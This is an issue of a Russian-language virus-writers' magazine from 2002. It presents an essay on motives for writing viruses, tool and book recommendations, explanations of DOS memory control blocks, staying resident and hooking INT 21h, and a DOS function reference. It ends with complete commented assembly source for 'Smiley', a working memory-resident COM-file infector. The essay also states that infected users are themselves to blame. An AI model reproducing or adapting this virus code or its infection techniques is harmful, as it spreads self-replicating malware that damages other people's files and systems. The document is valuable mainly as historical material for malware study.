
                        -=POWER HEAP RESEARCH=-
            =>независимая оpганизация наyчных исследований<=

  ▀▀▀▀▀▀ ▀▀▀   ▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀ ▀▀▀▀▀▀
    ▀▀   ▀▀▀▀  ▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
    ▀▀   ▀▀ ▀▀ ▀▀ ▀▀▀▀▀   ▀▀▀▀▀   ▀▀▀         ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀
    ▀▀   ▀▀  ▀▀▀▀ ▀▀      ▀▀       ▀▀   ▀▀    ▀▀    ▀▀      ▀▀   ▀▀
  ▀▀▀▀▀▀ ▀▀   ▀▀▀ ▀▀      ▀▀▀▀▀▀▀   ▀▀▀▀▀     ▀▀    ▀▀▀▀▀▀▀ ▀▀▀▀▀▀

            ▀▀▀▀▀▀▀       ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀    ▀▀▀▀▀
            ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀   ▀▀  ▀▀
            ▀▀▀▀▀   ▀▀▀▀▀ ▀▀▀▀▀▀  ▀▀   ▀▀ ▀▀▀▀▀▀  ▀▀▀  ▀▀▀▀
            ▀▀            ▀▀   ▀▀ ▀▀   ▀▀ ▀▀  ▀▀   ▀▀   ▀▀
            ▀▀▀▀▀▀▀       ▀▀▀▀▀▀   ▀▀▀▀▀  ▀▀   ▀▀   ▀▀▀▀▀
                        Helloween.virus@mail.ru

                         [ЖУРHАЛ  ВИРМЕЙКЕРОВ]

                     ┌───────────────────────────┐
                     │ Hомеp 1 за 2002 (номеp 6) │
                     └───────────────────────────┘




                     Зачем люди пишут вирусы?

 Некоторые задают этот вопрос с удивлением, некоторые с ярко  вы-
раженной злобой, третьи с ленивым равнодушием, но  тем  не  менее
продолжают сущестовать люди, которые интересуются этой задачей не
с точки зрения заурядного обывателя, а как программист-системщик.
Писать вирусы можно по разным  причинам.  Одним  нравится  изучат
системные вызовы, искать дыры в  антивирусах  и  совершенствовать
свои знания в ассемблере. То есть исключительно программирование.
Возможно читатель скажет что программировать можно и  нечто  иное
нежели вирус. Знаете, это как охота - можно  побегать  за  оленем
рискуя самому быть съеденым стаей волков, а можно  пострелять  по
мишеням в игровом зале. Ощущения разные, хотя принцип один и  тот
же. Так же и вирус. Если обычная программа  находится  в  дружес-
твенной среде, где ей все рады, где пользователь  в  случае  чего
настроит систему под нее, освободит память, то  вирус  растет  во
враждебной обстановке, где каждая  сволочь  ему  готова  оторвать
нужное место, где анитивирусы вопят на каждом углу и где паранои-
дальные пользователи при каждой опасности форматируют  винт.  Вот
тут то и понадобится наша смекалка и выдумка. Вирмейкеру надо ид-
ти на шаг впереди остальных чтобы опередить, чтобы его вирус  вы-
жил. Если автор программы может относиться к ней спустя рукава  -
доделает когда понадобится, то автору вируса нужно  предусмотреть
все. Вирус должен жить всегда. В не зависимости от того,  сколько
свободно памяти или включен ли виртуальный режим. Другими  слова-
ми - вирус - это творчество, изобретение новых приемов программи-
рования знание системы как пяти пальцев. К  другой  группе  людей
относятся те, кто стремится насолить всем подряд, вставляя в свои
вирусы дикую деструкцию. Против деструкции я  ничего  не  имею  -
пользователь сам виноват что заразился. Но и подход  "вирус  ради
деструкции" я не одобряю. Как правило в  таких  вирусах  основной
уклон делается на жестокие  деструктивные  алгоритмы,  автор  19ю
сбособами стирает FAT или выжигает монитор. Это, конечно, весело,
но в такой погоне за уничтожением забываются изящные приемы прог-
раммирования, вирус становится примитивным и не представляет  ин-
тереса для разработчика. Зато  лишний  повод  для  антивирусников
поплакаться в жилетку серой общественности что де какие технокры-
сы злобные. И, наконец, к третьей группе относятся мелкие посред-
ственности, стремящиеся побыстрее создать вирус  дабы  попасть  в
virlist и похвастаться своим школьным шлюшкам. К  таким  людям  я
отношусь крайне отрицательно. Мало того,  что  вирус  зауряден  и
примитивен, так в 95% он содран у другого. Загляните  в  virlist,
сколько там вирусов типа jerusalem, vienna, khiznak.  Знайте,  их
нацарапали тупоголовые недоумки с целью почувствовать  себя  кру-
тым технокрысой. Наверняка сейчас толпа этих ламеров ринутся  ви-
дирать вири из этого жypнала, вставлять свои  копирайты  и  отсы-
лать Данилову. Не бойтесь, Игорь и существует за счет  таких  лю-
дей. Он с радостью вставит все милые строчки  в  свой  virlist  и
прославит на страну еще кучу "крутых вирмейкеров". Туда им всем и
дорога.


        Какие средства использовать для разработки вирусов?

  Это дело вкуса. Главное чтобы вам было удобно и привычно.  Хотя
если вы привыкли писать на  паскале,  то  переучиваться  все-таки
придется, если хотите писать  высокотехнологичные  вирусы.  Итак,
вам требуется :

        1) ассемблер
        2) отладчик
        3) монитор или вьювер памяти
        4) дизассемблер.

  Из ассемблеров наиболее популярны masm & tasm. Есть люди, кото-
рые используют asm86, editasm или еще какую диковинку. Не  важно.
Ассесмблер он и в Африке ассемблер. Они все отличаются лишь спис-
ком поддерживаемых процессоров и внутренними директивами. Я пред-
почтаю masm 6.0. Существует также masm 6.1, но его я не  рекомен-
дую, так как он нестабильно работает. tasm я все-таки тоже не ре-
комендую - он не оптимизирует ближние jmp'ы, то есть если  делаем
переход ближе чем на 127 байт масм догадывается  об  этом  и  ис-
пользует два байта, в то время как тасм  резервирует  3  байта  и
вставляет туда один NOP. Для вируса подобные шутки могут быть фа-
тальными.

 Отладчик. В качестве первого приближения можно назвать  CodeView
и TurboDebugger из комплекта Masm/Tasm соответственно.  Поработав
некоторое время с ними вы увидите, как легко надрать задницу  от-
ладчику реального режима. Но у них есть достоинство -  они  рабо-
тают в виртуальном режиме, например в окне  win95  -  иногда  это
критично. Если вы ищите простой и удобный отладчик, то могу посо-
ветовать DeGlucker - это  отладчик  защищенного  режима,  его  вы
просто так не наколете, но его надо загружать без  Emm386.  Можно
еще посоветовать Soft-ice - тоже несомненно мощный  отладчик,  но
имхо чересчур громоздкий и сложноват для новичка.

 Монитор или вьювер памяти. Очень часто надо  выяснить,  куда  же
сел наш вирус, какие прерывания перехватил, что находится  в  его
буфере. Для этого очень удобны утилитки касперского, назыаемые
-util, avputil и еще одна утилитка Mview. Назначение их одно -  в
удобной форме просматривать содержимое памяти, системных  таблиц,
перехваченные вектора, дизассемблировать резиденты.

 Дизассемблер. Бывает так, что вирус работает, а  вот  зараженные
второй копией программы уже нет. Надо выяснить почему они  виснут
- тут не обойтись без Hiew или Qview. С помощью этих программ  вы
сможете проверить поля заголовков, дизассемблировать  код,  найти
подстроку и даже внести исправления с помощью встроенного HEX-ре-
дактора и ассемблера. Бывало, я писал маленькие программки  цели-
ком на внутреннем ассемблере hiew :)

 Ах, да, чуть не забыл. Вам наверняка потребуется  текстовый  ре-
дактор. Вот сейчас я пишу  сей  текст  в  edit.com  by  Alexander
Safonenkov. Очень удобная и компактная вещь. Жалко что файлы  бо-
лее 64к не дает редактировать. Еще я пользуюсь средой от Quick  C
2.5. Нет, на си я не пишу. Просто тот редактор заглатывает  файлы
по 300 килов, да и удобства есть разные.

 Ну и конечно вам не обойтись без всяких собственных тулз,  кото-
рые частенько приходится ваять на скорую руку за 10 минут :)  Так
что учите какой-нибудь простой язык высокого уровня, например Ва-
сик. ;)

                   Какую литературу читать?

 Конечно журнал Play-Boy... Шучу, шучу. Сразу могу  сказать,  что
вам не обойтись без Interrupt-List by Ralf Broun. Это очень  под-
робное описание всех прерываний системы. Также содержит  описания
сотен системных областей, форматов структур,  недокументированные
функции. Распростраянется в элетронном виде. Пока последняя  вер-
сия 53. А года два назад мне  довелось  купить  печатный  вариант
версии 38. Это такие две книженции формата  А4  страниц  по  300.
Хоть и громоздко зато удобно, кроме того все на русском, чего  не
скажешь об электронной версии. Для новичка это может быть критич-
но. Называется она Р.Браун. "Справочник по  прерываниям  IBM  PC"
Москва, издательство "Мир", 1994.

 Еще вам наверняка понадобится книжка по ассемблеру.  Электронных
книг полно, даже в помощи к masm  есть  полная  дока  к  командам
вплоть до pentium. А вот бумажная все равно удобнее. Самая  удоб-
ная, которую я встречал - В.Л.Григорьев "Архитектура и программи-
рование микропроцессора i486". Москва, "Гранал, Бином" 1993 Глав-
ным критерием в выборе книги должно быть полное описание всех ко-
манд с указанием их кодов и времени выполнения. Откройте книжку и
поищите там описания ARPL, BSWAP, DAA, FIMUL, CALL, SHRD  и  XOR.
Если нашли все, то можете смело ее покупать.

 Потом что-нибудь по железу. Этим прилавки забиты. Ваша избранни-
ца должна содержать описания портов ввода-вывода,  формат  регис-
тров таймера и винчестера, дисковых структур, системные области в
памяти. Это есть например, в Р.Джордейн "Справочник  программиста
персональных компьютеров типа IBM PC, XT и AT", Москва,  "Фин.  и
статистика" 1992

 Еще могу посоветовать гипертекстовую базу tech help. Там вы най-
дете тоже кучу интересного. Как стать резидентом.

 Прежде всего следует рассказать об  организации  памяти  MS-DOS.
Память разделена на участки (блоки), ряд из них являются фиксиро-
ванными (например, таблица прерываний или видеопамять), а динами-
ческие блоки описываются  в  MCB - Memory  Control  Block  -  Это
16-байтовая стpуктуpа, пpедшествующая в памяти любому блоку в па-
мяти, выделенному досом. Итак:

│M/Z│ owner │ lenght│   trash   │           name                │
└───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┴───┘

 M/Z    - это пpизнак (ASCII) - пpомежуточный или последний блок в
          цепочке
 owner  - сегментный адpес владельца блока
 lenght - длина блока в паpагpафах не считая MCB
 trash  - не используется
 name   - имя блока. Если блок владеет сам собой, то там выставляется
          имя запущенной пpогpаммы.

 Когда пpогpамма завеpшает свою pаботу, то все блоки, пpинадлежа-
щие ей освобождаются, то есть в качестве сегмента владельца  ста-
вится 0. Если мы выходим с оставлением pезидентном,  то  основной
блок уpезается до нужного pазмеpа, все остальные блоки выгpужают-
ся, а этот оставляется. Кpоме того,  есть  еще  заpезеpвиpованное
значение owner = 8 - это системные данные. Выгpужаться они естес-
твенно не будут. Там есть еще тонкости - в  поле  имени  пpостав-
ляется тип этих данных: SC - SytemCode, SD  -  SystemData,  SS  -
SystemStack и так далее, есть еще  pасшиpенный  фоpмат  данных  -
блок один, а в нем несколько подблоков - но это тебе вpяд ли нуж-
но.

   Итак, чтобы остаться pезидентом необходимо и вполне достаточно:

   1) Освободить кусочек памяти от основной пpогpаммы
   2) Выделить блок
   3) Скопиpоваться туда
   4) пpоставить адpесом владельца 8 или 70h (это сегмент  DOS  -
      тоже нехило)
   5) Пpодолжить пpогpамму.

 Когда пpогpамма стаpтует, то в памяти ей выделяется два блока  -
в одном маленьком хpанится  Environment  с  сылкой  владельца  на
втоpой блок, а втоpой блок - собственно сама  пpогpамма  pазмеpом
во всю оставшуюся память. Каждому блоку  пpедшествует  свой  MCB.
Если, напpимеp, сегмент пpогpаммы будет 13BA, то сегмент  ее  MCB
очевидно 13B9.

 Вот пpимеp куска виpуса. Фоpмат СОМ/ЕХЕ не  важен,  так  как  DS
всегда указывает на сегмент PSP. Hо вообще я буду  подpазумевать,
что виpус пpистыкован вначале СОМ-файла. Для пpостоты и чтобы ку-
чу меток не гоpодить.

                org 100h
                my_size = (_end - _beg +15)/16 ; pазмеp в паpагpафах
        _beg:
                mov ax,ds
                dec ax
                mov ds,ax
                mov bx,ds:[3]    ; получаем pазмеp основного блока
                sub bx,my_size+1 ; догадайся, зачем вычитаем
                mov ah,4Ah       ; на паpагpаф больше ;)
                int 21h
                mov bx,my_size
                mov ah,48h
                int 21h
                sub ax,16       ; надеюсь, это понятно? Компилиpуем с 100h
                mov es,ax       ; - пусть и в памяти со 100h начинается
                push cs
                pop ds
                mov si,100h
                mov di,100h
                mov cx,_end - _beg
                cld
                rep movsb
                push es
                push offset _cont
                retf
        _cont:
                mov word ptr cs:[0F1h],8 ; коppектиpуем MCB
                ; [...] твоpим че хотим
                push ds         ; - ds - стаpый, от основной пpогpаммы
                pop es
                lea si,_end
                mov di,100h
                push es
                push di
                mov cx,32000
                rep movsw       ; сдвигаем пpогpамму на место.
                retf
        _end:

 И наконец - есть еще такая хоpошая вещь, как UMB - это опеpатив-
ная память около 90к, pасполагающаяся в сегментах D000 - EFFF или
вpоде того. А получается она за счет тpансляции стpаниц  на  пpо-
цессоpах 386+, что обеспечивается чеpез Emm386 или  qemm.  Hу  да
это не важно, а важно то, что ты можешь остаться pезидентным  там
- память экономишь, дыpы не делашь и веб не будет pугаться.  Что-
бы остаться pезидентом в UMB надо включить pежим  выделения  бло-
ков там - это функция 58 и ее подфункции. Hу да ладно, вот кусок,
котоpый выделяет нужную память спеpва в UMB, а потом уж в Low ко-
ли облом:

        mov ax,5800h
        int 21h
        push ax
        mov ax,5802h
        int 21h
        push ax
        mov bx,1
        mov ax,5803h
        int 21h
        mov bx,80h
        mov ax,5801h
        int 21h
        mov ah,48h      ;
        mov bx,my_size  ; Это как выше
        int 21h         ;
        sub ax,16       ;
        mov es,ax       ;
        pop cx
        pop bx
        mov ax,5801h
        int 21h
        mov bl,cl
        mov ax,5803h
        int 21h


                   Как перехватить прерывание?

 Ну это совсем элементарно.  Что  такое  вектор  прерывания?  Это
ячейка, где хранится адрес обработчика этого прерывания. Так  как
адрес хранится в формате сегмент:смещение, то, следовательно, для
его хранения необходимо 4 байта. А так как всего  существует  256
прерываний с номерами от 00 до FF, то таблица  векторов  прерыва-
ний имеет размер 1024  байта.  Эта  таблица  хранится  по  адресу
0000:0000, то есть самой первой в памяти. Итак, как же узнать ад-
рес вектора прерывания? Очевидно что номер прерывания,  помножен-
ный на 4. Hапример для int 21h это 0084h, а для int 8 это  0020h.
Что-же надо сделать чтобы вклиниться в обработку прерывания?  На-
до назначить адрес обработчика на свой обработчик, а в конце пос-
тавить переход на старый адрес. Например, если нам надо  перехва-
тить в вирусе int 21h с целью заражать все запускаемые файлы,  то
делаем примерно следующее:

            push 0
            pop ds

            mov ax,cs           ;
            shl eax,16          ;  EAX=seg:off нашего обработчика
            lea ax,New_21       ;
            xchg eax,ds:[84h]   ; получаем адрес старого обработчика и
                                ; сразу записываем свой. два дела сразу :)
            mov cs:old_21,eax   ; сохраняем старый адрес

             ...                ; здесь идет другой код


   New_21:                      ; это наш обработчик
            cmp ah,4Bh          ; проверка функции.
            jz Infect           ; да, это выполняется запуск и имя
                                ; программы передается в ds:dx
   go_21:
            byte 0EAh           ; FAR JMP на старый обработчик
            Old_21        dd 0


   Infect:                      ; это процедура заражения.

            pusha               ; вы не забываете сохранять регистры? ;)
              ..
            popa
            jmp go_21           ; переходим на старый обработчик



              Список наиболее часто используемых функций DOS.


 Вот список функций, которые важно помнить при разработке вирусов:

        Установить адрес DTA.
        ~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 1Ah
                ds:dx   = адрес

        выход:
                нет

        Получить адрес DTA.
        ~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 2Fh

        выход:
                es:bx   = текущий адрес

        Create - Создать файл.
        ~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 3Ch
                cx      = атрибуты файла (таб 1)
                ds:dx   = путь и имя файла в формате asciz

        выход:
                if CF=0 then
                  ax    = дескриптор файла
                else
                  ax    = код ошибки (3,4,5) (таб 2)

        Open - Открыть существующий файл
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 3Dh
                al      = режим доступа (таб 2)
                cx      = атрибуты
                ds:dx   = имя
        выход:
                if CF=0 then
                  ax    = дескриптор файла
                else
                  ax    = код ошибки (1,2,3,4,5,0C)

        Close - Закрыть файл
        ~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 3Eh
                bx      = дескриптор
                ds:dx   = имя
        выход:
                if CF=0 then
                  ax    =
                else
                  ax    = код ошибки (6)

        Read - Чтение из файла
        ~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 3Fh
                bx      = дескриптор
                cx      = число байт
                ds:dx   = буфер для чтения
        выход:
                if CF=0 then
                  ax    = число прочитанных байт
                          Это значение может быть меньше CX.
                          Например потому, что превысили длину файла.
                else
                  ax    = код ошибки (5,6)

        Write - Записать в файл
        ~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 40h
                bx      = дескриптор
                cx      = число байт
                ds:dx   = данные для записи
        выход:
                if CF=0 then
                  ax    = число записанных байт
                else
                  ax    = код ошибки (5,6)

        Unlink - Удалить файл
        ~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 41h
                cx      = атрибуты
                ds:dx   = имя
        выход:
                if CF=0 then
                  ax    =
                else
                  ax    = код ошибки (2,3,5)

        LSeek - Установить указатель в файле
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 42h
                al      = точка отсчета указателя:
                          0 - от начала файла
                          1 - от текущего положения
                          2 - от конца
                bx      = дескриптор
                cx:dx   = смещение (cx=старшие 16 бит, dx=младшие)
        выход:
                if CF=0 then
                  dx:ax = новое положение указателя относительно начала
                else
                  ax    = код ошибки (1,6)

        Получить атрибуты файла
        ~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ax      = 4300h
                ds:dx   = имя
        выход:
                if CF=0 then
                  cx    = атрибуты
                else
                  ax    = код ошибки (1,2,3,5)

        Chmod - Установить атрибуты файла
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ax      = 4301h
                cx      = новые атрибуты
                ds:dx   = имя
        выход:
                if CF=0 then
                  ax    =
                else
                  ax    = код ошибки (1,2,3,5)

        Выделить блок памяти
        ~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 48h
                bx      = размер блока в параграфах
        выход:
                if CF=0 then
                  ax    = сегмент блока
                else
                  ax    = код ошибки (7,8)
                  bx    = размер наибольшего доступного блока

        Освободить память
        ~~~~~~~~~~~~~~~~~
        вход:
                ah      = 49h
                es      = сегмент блока
        выход:
                if CF=0 then
                  ax    =
                else
                  ax    = код ошибки (7,9)

        Изменить размер блока памяти
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 4Ah
                bx      = новый размер
                es      = сегмент
        выход:
                if CF=0 then
                  ax    =
                else
                  ax    = код ошибки (7,8,9)
                  bx    = размер наибольшего доступного блока

        Exec - загрузить или выполнить программу.
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 4Bh
                al      = тип загрузки:
                        0 - загрузить и выполнить
                        1 - загрузить и не выполнять
                        3 - загрузить оверлей
                        4 - загрузить и выполнить в фоновом режиме (dos 4.0)
                es:bx   = блок параметров (таб 3)
                ds:dx   = имя программы

        выход:
                if CF=0 then
                  bx,dx разрушены
                else
                  ax    = код ошибки (1,2,5,8,0A,0B)

        FindFirst - найти первый файл.
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 4Eh
                cx      = маска атрибутов
                ds:dx   = маска имени (может содержать путь, * и ?)

        выход:
                if CF=0 then
                  [DTA] - найденный файл (таб 4)
                else
                  ax    = код ошибки (2,3,12h)

        FindNext - найти следующий файл.
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ah      = 4Fh
                [DTA]   = структура от предыдущего вызова (не изменять!)

        выход:
                if CF=0 then
                  [DTA] - следующий файл
                else
                  ax    = код ошибки (12h)

        Получить дату и время файла.
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ax      = 5700h
                bx      = дескриптор файла

        выход:
                if CF=0 then
                  cx    = время (как в таб 4)
                  dx    = дата
                else
                  ax    = код ошибки (1,6)

        Установить дату и время файла.
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        вход:
                ax      = 5701h
                bx      = дескриптор файла
                cx      = время (как в таб 4)
                dx      = дата

        выход:
                if CF=0 then

                else
                  ax    = код ошибки (1,6)


        Таблица 1. Атрибуты файлов:
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~
          бит   значение
           0      ReadOnly
           1      Hidden
           2      System
           3      VolumeLabel
           4      Directory
           5      Archive
           6      not used
           7      not used
           8      Shared (only Netware)


        Таблица 2. Коды ошибок.
        ~~~~~~~~~~~~~~~~~~~~~~~
          1     Неверный номер функции
          2     Файл не найден
          3     путь не найден
          4     Слишком много открытых файлов
          5     Доступ запрещен
          6     Недопустимый дескриптор
          7     Разрушен блок управления памятью
          8     Недостаточно памяти
          9     Недопустимый адрес блока памяти
          A     Ошибка окружения
          B     Недопустимый формат
          11    Не то же устройство
          12    Больше нет файлов


        Таблица 3. Блок параметров Exec.
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Offset  Size

          00 word Сегмент  окружения,  копируемый  для  дочернего
                        процесса. Если 0, то  сегмент  вызывающей
                        программы.
          02 dword указатель на  командную  строку  к  программе.
                        Первый байт командной строки - ее длина.
          06    dword   Указатель на первый FCB
          0A    dword   Указатель на второй FCB
          0E dword (для  al=1) будет  содержать  начальный  ss:sp
                    программы.
          12    dword   (для al=1) будет содержать току входа cs:ip


        Таблица 4. Структура DTA для поиска файлов:
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Offset  Size
          00     15h    Зарезервировано.
          15h   byte    атрибуты файла
          16h   word    Время файла: биты 11-15 - час,
                                          5-10  - минута
                                          0-4   - секунды/2

          18h   word    Дата файла:  биты 9-15  - год-1980
                                          5-8   - месяц
                                          0-4   - день
          1Ah   dword   размер файла.
          1Eh   0Dh     имя + расширение в формате asciiz.


                         Простейший COM.TSR


 Итак, резидентным оставаться мы уже умеем, прерырание перехваты-
вать тоже научились. Пора начать писать маленькие  виры.  Зараже-
ние ЕХЕ-шников оставим на десерт, займемся СОМушниками.  Дабы  не
распускать пустых соплей сразу  кину  комментированный  исходник,
изучайте, господа.

        .model tiny     ; Это модель памяти. Для того чтобы
                        ; компилировать в COM-формат нужно TINY.

        .386            ; Команды какого процессора разрешить.

        .code           ; Начало кода.

        .startup        ; Точка входа

        org 100h        ; начальный адрес.

        _real   equ _end - _beg         ; Это размер вируса
        _size   equ (_real+15)/16       ; Это размер вируса в параграфах

_beg:
        mov ax,cs
        dec ax
        mov ds,ax
        mov bx,ds:[3]
        sub bx,_size+1
        mov ah,4ah
        int 21h
        mov bx,_size
        mov ah,48h
        int 21h

        push cs         ; Теперь вирус пересылает себя в
        pop ds          ; Выделенный фрагмент
        sub ax,10h
        mov es,ax
        mov di,100h
        mov si,di
        push cs
        push di
        mov cx,_real
        rep movsb
        push es         ; Теперь передаем управление резидентной
        push _res       ; части.
        retf

_res:                   ; мы используем для заражения метод записи в
        pop di          ; начало. Соответственно для лечения в памяти
        push di         ; надо просто переслать все от хвоста вируса
        mov cx,32000    ; на место его головы.
        push ds
        pop es
        rep movsw
        mov ax,1E03h    ; Обратите внимание! Вирусу нельзя заражать память
        int 21h         ; многократно - для этого он использует пустую
        cmp ax,031Eh    ; функцию 1E, которая возвращает 0, а если
        jz _no          ; мы резидентны, то возвращаем 031E
        mov ds,cx
        mov ax,_int21
        mov bx,cs
        xchg ax,ds:[84h]
        xchg bx,ds:[86h]
        push cs
        pop ds
        mov ds:_go21o,ax
        mov ds:_go21s,bx
        mov word ptr ds:[0F1h],8        ; не забыли про MCB ? ;)
_no:
        push es
        pop ds
        retf
_check:
        xchg ah,al
        iret

_int21:
        cmp ax,1E03h    ; проверка на резидентность.
        jz _check
        cmp ah,4Bh      ; заражаем при запуске
        jnz _go
        cld
        pusha
        push es
        push ds
        mov cx,256
        xor al,al
        mov di,dx
        push ds
        pop es
        repnz scasb
        jnz _noinfect
        mov si,di               ; COMMAND.COM заражать нельзя
        sub si,12
        lodsd
        and eax,0DFDFDFDFh      ; приводим к заглавным буквам
        cmp eax,'MMOC'
        jnz _infect
        lodsw
        and ax,0DFDFh
        cmp ax,'NA'
        jz _noinfect
_infect:
        mov ah,48h      ; выделяем для своих нужд 64к памяти
        mov bx,4096
        int 21h
        mov es,ax
        jnc _inf1
        mov ah,49h
        int 21h
        jmp short _noinfect
_inf1:
        mov ax,3D02h
        int 21h
        jc _noinf2
        xchg ax,bx
        push es
        pop ds
        xor dx,dx
        mov cx,-1
        mov ah,3Fh
        int 21h
        cmp word ptr ds:[0],'MZ'        ; EXE тоже не заражаем.
        jz _noinf
        cmp word ptr ds:[0],'ZM'
        jz _noinf
        cmp word ptr ds:[_sig - _beg],'):'      ; проверка на зараженность
        jz _noinf
        cmp ax,64000
        jnc _noinf
        push ax
        push ds

        xor cx,cx
        xor dx,dx
        mov ax,4200h
        int 21h
        mov cx,_real    ; записываем вирус.
        push cs
        pop ds
        mov dx,100h
        mov ah,40h
        int 21h
        pop ds
        pop cx
        xor dx,dx       ; записываем программу
        mov ah,40h      ; кстати, мы не сохраняем атрибутов и даты
        int 21h         ; файла, а это делать надо. Кроме того,
                        ; желательно перехватывать int 24 для
                        ; погашения критических ошибок (например,
                        ; запись на дискетку с защитой от записи)
_noinf: mov ah,3Eh
        int 21h
_noinf2:
        mov ah,49h      ; освободили память
        int 21h
_noinfect:
        pop ds
        pop es
        popa
_go:
        byte 0EAh       ; Команда JMP FAR
_go21o  dw 0
_go21s  dw 0
_sig    byte ':)'       ; Сигнатура зараженности. Пусть наш вирус
                        ; называется Smiley. Коротко и сердито :)

_end:
        mov dx,_msg-_end+100h
        mov ah,9
        int 21h
        mov ax,4c00h
        int 21h
_msg    db 'Вирус стартовал',13,10,36
end

                                                  AK